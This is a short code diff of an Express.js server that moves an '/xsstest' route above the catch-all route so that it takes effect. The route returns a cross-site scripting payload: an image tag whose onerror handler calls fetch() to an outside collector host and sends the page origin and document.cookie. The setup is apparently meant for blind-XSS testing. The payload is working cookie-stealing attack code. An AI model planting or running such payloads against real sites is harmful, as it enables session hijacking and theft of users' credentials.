@@ -196,6 +196,10 @@ app.get("/health", async (req, res) => {
     res.end()
 })
 
+app.all("/xsstest", (req, res) => {
+  res.send('{"debug":"<img src=x onerror=fetch(`https://xless-neon.vercel.app/?origin=${origin}&cookie=${document.cookie}`)>"}')
+})
+
 
 app.all("/*", (req, res) => {
   var headers = req.headers
@@ -209,9 +213,6 @@ app.all("/*", (req, res) => {
   });
 })
 
-app.all("/xsstest", (req, res) => {
-  res.send('{"debug":"<img src=x onerror=fetch(`https://xless-neon.vercel.app/?origin=${origin}&cookie=${document.cookie}`)>"}')
-})
 
 app.listen(port, err => {
     if (err) throw err
